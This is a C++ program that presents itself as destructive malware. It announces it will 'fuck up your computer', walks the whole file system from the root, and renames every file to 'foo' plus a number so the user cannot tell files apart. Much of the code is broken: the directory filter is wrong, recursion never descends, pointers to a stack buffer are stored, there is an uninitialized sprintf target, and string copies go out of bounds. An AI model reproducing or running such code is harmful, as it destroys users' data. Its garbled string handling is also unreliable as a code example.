#include <stdio.h>
#include <dirent.h>
#include <cstring>

#ifdef WIN32
#define PATH_SEPERATOR '\\'
#define ROOT "C:\\"
#else
#define PATH_SEPERATOR '/'
#define ROOT "/"
#endif

int getFiles(const char* root,char** files,int n=0){
    DIR* dir;
    struct dirent* entry;

    if(!(dir = opendir(root)) || !(entry = readdir(dir)))
        return 1;

    do{
        if(strcmp(entry->d_name,".")==0||strcmp(entry->d_name,"..")) continue;

        char path[1024];
        int len = snprintf(path,sizeof(path)-1,"%s/%s",root,entry->d_name);
        path[len] = 0;
        if(entry->d_type == DT_DIR){
            getFiles(root,files);
        }else{
            files[++n] = path;
        }
    }while(entry = readdir(dir));
    closedir(dir);

    return 0;
}

int getFileCount(const char* root,int count_start=0){
    DIR* dir;
    struct dirent* entry;

    int count = count_start;

    if(!(dir = opendir(root)) || !(entry = readdir(dir)))
        return 1;

    do{
        if(strcmp(entry->d_name,".")==0||strcmp(entry->d_name,"..")) continue;

        if(entry->d_type == DT_DIR){
            getFileCount(root,count);
        }else{
            count++;
        }
    }while(entry = readdir(dir));
    closedir(dir);

    return count;
}

char* replace(const char* subfrom, const char* subto, const char* str){
    if(!strstr(str,subfrom)) return NULL;

    int len = strlen(str)-strlen(subfrom)+strlen(subto);
    char* string = new char[len];

    int subloc = strstr(str,subfrom)-str;
    int end_of_subfrom = subloc+strlen(subfrom);
    int end_of_subto = subloc+strlen(subto);

    for(int i=0; i<subloc;i++){
        string[i] = str[i];
    }

    for(int i=0; i<strlen(subto);i++){
        string[subloc+i] = subto[i];
    }

    for(int i=end_of_subfrom; i<strlen(str); i++){
        string[end_of_subto+i] = str[end_of_subfrom+i];
    }

    return string;
}

char* replace(int pos,int len,const char* str,const char* sub){
    int sublen = strlen(sub);
    int slen =   strlen(str);

    int newlen = (slen-len)+sublen;
    char* string = new char[newlen];

    for(int i=0; i<pos;i++)
        string[i] = str[i];

    for(int i=0; i<sublen; i++)
        string[pos+i] = sub[i];

    for(int i=len; i<slen; i++)
        string[pos+sublen] = str[len+i];

    return string;
}

int main(int argc, char const *argv[])
{
    printf("Hello, today I will be fucking up your computer.");

    int size = getFileCount(ROOT);
    char** file_arr = new char*[size];

    if(getFiles(ROOT,file_arr)) return 1;

    int i=0;
    while(i<size){
        char* name = file_arr[i];
        char* s;
        char* str;

        int l = strrchr(name,PATH_SEPERATOR)-name;
        int l2 = strrchr(name,'.')-name;

        s = replace(l,(l2-l),"foo%d",name);

        sprintf(str,s,i);
        rename(name,str);

        i++;
    }

    printf("Replaced all of your filenames with foo.");
    printf("Good luck trying to figure out what is what!");

    return 0;
}

